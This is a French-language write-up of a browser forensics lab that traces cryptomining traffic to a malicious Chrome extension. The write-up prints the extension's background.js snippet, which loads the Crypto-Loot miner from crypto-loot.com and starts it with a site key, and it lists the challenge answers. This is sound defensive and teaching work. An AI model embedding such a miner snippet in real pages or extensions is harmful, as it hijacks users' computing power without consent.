# Browser Forensics – Cryptominer

## Scénario

Notre SOC a détecté du trafic lié au minage de cryptomonnaie provenant d’un poste fraîchement joint au réseau. L’équipe d’incident response a constaté que le trafic provenait d’applications navigateur. Après collecte des données clés du navigateur avec **FTK Imager**, l’objectif est d’analyser le fichier `.ad1` pour identifier la source du minage.

---

## Outils utilisés

* **FTK Imager** : montage et extraction du contenu de l’image `.ad1`.
* **Autopsy / Analyse manuelle** : inspection des profils, extensions et fichiers JavaScript.
* Éditeur de texte / SQLite Browser pour lire les fichiers `Preferences`, `History`, `Cookies`.

---

## Analyse et preuves

### 1. Profils de navigateur

Extraction du dossier `User Data` de Chrome depuis l’image :

* **Nombre de profils Google Chrome présents :** **2**

### 2. Thème installé

Dans le fichier `Preferences` du profil Chrome, on trouve l’URL suivante :

```
http://atavi.com/browser-themes/?from=chrome-themes&tid=earth_in_space
```

* **Nom du thème :** **Earth in Space**

### 3. Extension malveillante (cryptominer)

Dans le répertoire `Extensions` du profil Chrome, l’extension suspecte a été trouvée avec les métadonnées suivantes :

* **Extension ID :** `egnfmleidkolminhjlkaomjefheafbbb`
* **Extension Name :** `DFP Cryptocurrency Miner`
* **Description :** `Allows staff members to mine cryptocurrency in the background of their web browser`

Ces informations proviennent des fichiers `manifest.json` et des métadonnées d’extension exportées depuis l’image.

### 4. JavaScript du miner

Le fichier `background.js` de l’extension contient le code suivant extrait :

```html
<script src="https://crypto-loot.com/lib/miner.min.js"></script>
<script>
var miner = new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0', {
    threads:3, autoThreads:false, throttle:0.2,
});
miner.start();
</script>
```

* **Nom du web miner JS :** **Crypto-Loot**
* **Public key utilisée :** `b23efb4650150d5bc5b2de6f05267272cada06d985a0`
* **Hashes par seconde observés (d’après le script) :** **20**
* **URL officielle Twitter du service :** `https://twitter.com/CryptoLootMiner`

Les événements et métriques sont également exposés via `miner.getHashesPerSecond()`, `miner.getTotalHashes()` et `miner.getAcceptedHashes()`.

---

## Timeline d’investigation (résumé des actions)

1. Monter l’image `.ad1` dans FTK Imager (`File → Add Evidence Item → Image File`).
2. Parcourir `Users\<username>\AppData\Local\Google\Chrome\User Data\`.
3. Exporter les fichiers `Preferences`, le dossier `Extensions` et `background.js` pour analyse.
4. Rechercher dans `Preferences` le paramètre `theme` et dans `manifest.json`/`background.js` de l’extension les références au miner.
5. Confirmer le miner via la présence de `https://crypto-loot.com/lib/miner.min.js` et la clé publique.

---

## Conclusion

L’enquête démontre que le poste compromise exécutait un **cryptominer JavaScript (Crypto-Loot)** via une extension Chrome malveillante (`DFP Cryptocurrency Miner`). Le thème installé (`Earth in Space`) et l’extension étaient présents dans les profils utilisateur. Le miner utilisait la clé publique `b23efb46...` et tournait à ~**20 H/s** selon la métrique collectée dans le script.

### Recommandations opérationnelles

* **Désinstaller/blacklister** l’extension `egnfmleidkolminhjlkaomjefheafbbb` sur tous les postes.
* **Révoquer/retirer** l’extension depuis la console de gestion (ou via GPO si possible).
* **Bloquer** les domaines `crypto-loot.com` et les URL associées au niveau du proxy/pare-feu.
* **Analyser** les postes pour autres extensions ou scripts similaires.
* **Mettre à jour** la sensibilisation des utilisateurs sur les extensions non approuvées.

---

## Artefacts pertinents (chemins)

* `Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Preferences`
* `Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Extensions\egnfmleidkolminhjlkaomjefheafbbb\` *(fichiers manifest/background.js/etc.)*

---

## Annexes

* **Public key (miner) :** `b23efb4650150d5bc5b2de6f05267272cada06d985a0`
* **Twitter (official) :** `https://twitter.com/CryptoLootMiner`

---

